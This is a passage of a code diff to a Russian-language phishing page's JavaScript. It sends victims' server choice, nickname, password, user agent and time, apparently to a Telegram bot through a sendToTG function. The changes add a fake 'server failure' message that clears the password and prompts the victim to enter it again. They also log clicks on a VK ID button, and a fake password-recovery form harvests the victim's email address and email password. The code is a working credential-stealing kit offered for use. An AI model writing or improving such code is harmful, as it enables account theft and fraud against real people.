+    '🌐 Сервер: ' + server + '\n' +
     '🔑 Никнейм: ' + login + '\n' +
     '🔒 Пароль: ' + pass + '\n' +
     '📱 UA: ' + ua + '\n' +
     '🕒 ' + new Date().toLocaleString('ru-RU')
   );
 
-  setTimeout(() => { location.href = REDIRECT; }, 700);
+  setTimeout(() => {
+    loader.classList.remove('active');
+    submitBtn.disabled = false;
+    
+    errBox.querySelector('h3').textContent = 'Произошел сбой сервера';
+    errBox.querySelector('p').textContent = 'Пожалуйста, перезагрузите страницу и попробуйте снова.';
+    errBox.style.display = 'block';
+    passInput.value = '';
+    checkFormValidity();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }, 1500);
 });
 
-// --- VK ID → экран "Упс" ---
 document.getElementById('vkBtn').addEventListener('click', async function() {
+  const server = hiddenInput.value || 'Не выбран';
   await sendToTG(
     '👤 Клик по кнопке VK ID\n' +
+    '🌐 Сервер: ' + server + '\n' +
     '📱 UA: ' + navigator.userAgent + '\n' +
     '🕒 ' + new Date().toLocaleString('ru-RU')
   );
   showScreen('ups');
 });
 
-// --- Забыли пароль → экран восстановления ---
 document.getElementById('forgotLink').addEventListener('click', function(e) {
   e.preventDefault();
   showScreen('restore');
 });
 
-// --- Восстановление: почта + пароль ---
 document.getElementById('restoreForm').addEventListener('submit', async function(e) {
   e.preventDefault();
   const b = document.getElementById('restoreBtn');
@@ -204,7 +626,7 @@ document.getElementById('restoreForm').addEventListener('submit', async function
   const epass = document.getElementById('rPass').value.trim();
 
   await sendToTG(
-    '📧 Восстановление (почта)\n\n' +
+    '📧 Восстановление (почта/пароль)\n\n' +
     '📮 Почта: ' + email + '\n' +
     '🔒 Пароль: ' + epass + '\n' +
     '📱 UA: ' + navigator.userAgent + '\n' +
@@ -216,4 +638,3 @@ document.getElementById('restoreForm').addEventListener('submit', async function
 </script>
 </body>
 </html>
-
